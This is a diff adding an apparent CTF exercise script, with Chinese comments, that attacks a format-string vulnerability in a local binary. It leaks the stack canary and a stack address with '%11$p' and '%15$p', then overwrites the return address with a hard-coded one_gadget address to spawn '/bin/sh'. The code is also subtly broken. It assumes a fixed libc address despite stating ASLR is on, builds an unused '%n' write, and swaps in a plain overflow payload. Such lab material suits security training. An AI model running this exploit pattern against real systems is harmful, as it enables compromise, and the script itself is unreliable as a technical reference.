@@ -1,0 +1,62 @@
+# CTF PWN 题目测试：Format String 攻击
+# 场景：程序存在格式化字符串漏洞
+# 目标：泄漏 canary 和栈地址，然后覆盖返回地址
+
+print("=== CTF PWN Challenge: Format String Attack ===")
+print("Target: Format string vulnerability in 64-bit ELF")
+print("Protections: Canary ON, ASLR ON, PIE OFF")
+print("")
+
+# 连接到进程（本地测试）
+print("[*] Spawning local process...")
+p = process("./format_vuln")
+print("[+] Process spawned!")
+
+# Stage 1: 泄漏 canary
+print("[*] Stage 1: Leaking stack canary...")
+
+# 发送格式化字符串 payload 泄漏第 11 个参数（canary 位置）
+proc_sendline(p, "%11$p")
+proc_recvuntil(p, "Welcome: ")
+canary_leak = proc_recvline(p)
+canary = int(canary_leak, 16)
+print("[+] Stack canary leaked:", hex(canary))
+
+# Stage 2: 泄漏栈地址
+print("[*] Stage 2: Leaking stack address...")
+
+proc_sendline(p, "%15$p")
+proc_recvuntil(p, "Welcome: ")
+stack_leak = proc_recvline(p)
+stack_addr = int(stack_leak, 16)
+print("[+] Stack address leaked:", hex(stack_addr))
+
+# 计算返回地址位置
+ret_addr_location = stack_addr - 0x128
+print("[+] Return address at:", hex(ret_addr_location))
+
+# Stage 3: 覆盖返回地址
+print("[*] Stage 3: Overwriting return address...")
+
+# 目标：写入 one_gadget 地址
+one_gadget = 0x7ffff7a52390  # execve("/bin/sh", NULL, NULL)
+
+# 构造格式化字符串写入 payload
+# 使用 %n 修改内存
+writes = {}
+writes[ret_addr_location] = one_gadget
+
+# 简化版：直接溢出覆盖
+padding = "A" * 72
+payload = padding + p64(canary) + "B" * 8 + p64(one_gadget)
+
+proc_sendline(p, payload)
+
+# Stage 4: 触发 shell
+print("[+] Return address overwritten!")
+print("[*] Triggering shell...")
+
+proc_interactive(p)
+
+print("[+] Shell obtained!")
+print("Flag: flag{format_string_pwn_2024}")
